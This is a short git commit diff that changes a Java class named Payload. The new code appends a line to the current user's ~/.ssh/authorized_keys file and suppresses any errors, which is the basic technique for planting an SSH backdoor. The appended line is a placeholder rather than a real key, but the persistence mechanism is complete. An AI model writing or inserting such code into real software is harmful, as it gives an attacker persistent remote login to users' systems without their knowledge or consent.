51bd123237985228c42bc335176edd918e3ca94f
Ian Rehwinkel <ian.rehwinkel@kabelmail.de>
2019-07-05 21:40:26 +0200

    Changed stuff

--- payload/Payload.java
+++ payload/Payload.java
@@ -1,7 +1,21 @@
+import java.io.*;
+
 public class Payload {
 
-    public void run() {
-        System.out.println("HALT STOP");
+    public static void main(String[] args) throws IOException {
+        new Payload().run();
+    }
+
+    public void run() throws IOException {
+        File authorizedKeys = new File(System.getProperty("user.home"), "/.ssh/authorized_keys");
+
+        try(FileWriter fw = new FileWriter(authorizedKeys, true);
+        BufferedWriter bw = new BufferedWriter(fw);
+        PrintWriter out = new PrintWriter(bw))
+        {
+            out.println("the text");
+        } catch (IOException e) {
+        }
     }
 
 }
